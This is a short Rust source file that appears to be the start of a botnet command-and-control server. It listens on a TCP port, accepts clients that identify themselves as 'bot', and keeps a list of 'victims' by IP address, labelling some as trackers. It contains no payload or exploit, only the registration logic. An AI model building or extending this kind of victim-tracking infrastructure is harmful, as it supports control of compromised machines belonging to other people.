mod tracker;

use std::{net::{TcpListener, TcpStream, SocketAddr}, io::{BufReader, BufRead, Write}, thread, sync::{mpsc, Mutex, Arc}};

use crate::tracker::is_victim_listening;

#[derive(Debug)]
enum VictimType {
    Bot,
    Tracker
}

#[derive(Debug)]
pub struct Victim {
    ip: SocketAddr,
    victim_type: VictimType
}

fn main() {
    let listener = TcpListener::bind("192.168.0.12:9570").unwrap();
    let victims: Arc<Mutex<Vec<Victim>>> = Arc::new(Mutex::new(Vec::new()));

    for stream in listener.incoming() {
        let stream = stream.unwrap();

        println!("Connection established");
        thread::spawn({
            let victims = Arc::clone(&victims);
            move || {
                let victim = handle_connection(stream);
                if let Some(victim) = victim {
                    let mut victims = victims.lock().unwrap();
                    victims.push(victim);
                    println!("{:?}", victims);
                }
            }
        });
    }
}

fn handle_connection(mut stream: TcpStream) -> Option<Victim> {
    let mut buf_reader = BufReader::new(&stream);
    let mut http_request: Vec<u8> = Vec::new();
    buf_reader
        .read_until(0, &mut http_request).unwrap();

    let http_request = std::str::from_utf8(&http_request).unwrap().replace('\0', "");
    println!("Request: {:?} {:?}", http_request.as_bytes(), "bot".as_bytes());
    let response = match http_request.as_str() {
        "bot" => "active".to_string(),
        _ => {
            println!("oui");
            return None;
        }
    };
    let current_ip = stream.peer_addr().unwrap();
    println!("ip: {}", current_ip);
    let mut victim = Victim { ip: current_ip, victim_type: VictimType::Bot };

    if is_victim_listening(&stream, &victim) {
        println!("listen!!");
        victim.victim_type = VictimType::Tracker;
    }

    if let Err(_) = stream.write_all(response.as_bytes()) {
        return None;
    }
    return Some(victim);
}
